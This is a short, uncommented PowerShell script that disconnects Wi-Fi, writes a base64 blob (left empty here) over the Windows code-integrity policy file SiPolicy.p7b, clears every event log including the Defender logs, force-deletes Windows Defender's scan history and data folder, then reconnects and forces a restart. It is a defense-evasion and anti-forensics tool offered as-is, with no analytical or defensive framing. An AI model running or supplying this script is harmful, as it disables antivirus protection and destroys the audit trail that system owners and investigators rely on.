Disable-NetAdapter -Name "Wi-Fi" -Confirm:$false
$base64Content = ""
$p7bContent = [Convert]::FromBase64String($base64Content)
[System.IO.File]::WriteAllBytes("C:\Windows\System32\CodeIntegrity\SiPolicy.p7b", $p7bContent)
wevtutil el | ForEach-Object { wevtutil cl $_ }
wevtutil cl "Microsoft-Windows-Windows Defender/Operational"
wevtutil cl "Microsoft-Windows-Windows Defender/Debug"
wevtutil cl "Microsoft-Windows-MpEngine/Operational"
wevtutil cl "Microsoft-Windows-MpEventLog/Operational"
wevtutil cl "Microsoft-Windows-Windows Defender/Antimalware"
Remove-Item -Path "C:\ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force
Remove-Item -Path "C:\ProgramData\Microsoft\Windows Defender\*" -Recurse -Force
Enable-NetAdapter -Name "Wi-Fi" -Confirm:$false
Restart-Computer -Force
